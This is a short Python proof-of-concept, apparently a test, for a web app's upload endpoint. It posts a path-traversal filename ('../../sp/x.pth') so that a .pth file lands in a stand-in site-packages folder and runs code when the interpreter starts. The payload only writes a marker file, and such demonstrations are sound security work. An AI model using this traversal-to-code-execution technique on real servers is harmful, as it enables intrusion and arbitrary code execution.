from v_common import *
import io, os, subprocess, sys
i = setup('none')
base = var.base_dir
os.makedirs(base + '/sp')          # stands in for venv/lib/pythonX/site-packages
c = i.web.test_client()
payload = b"import os; open(%r,'w').write('code executed')\n" % (base + '/RCE_MARKER')
r = c.post('/upload', data={'file': (io.BytesIO(payload), '../../sp/x.pth', 'audio/mpeg'), 'targetdir': ''},
           content_type='multipart/form-data')
print('upload ../../sp/x.pth ->', r.status_code, os.listdir(base + '/sp'))
subprocess.run([sys.executable, '-c', 'import site; site.addsitedir(%r)' % (base + '/sp')])
print('marker created by .pth on interpreter startup:', os.path.exists(base + '/RCE_MARKER'))
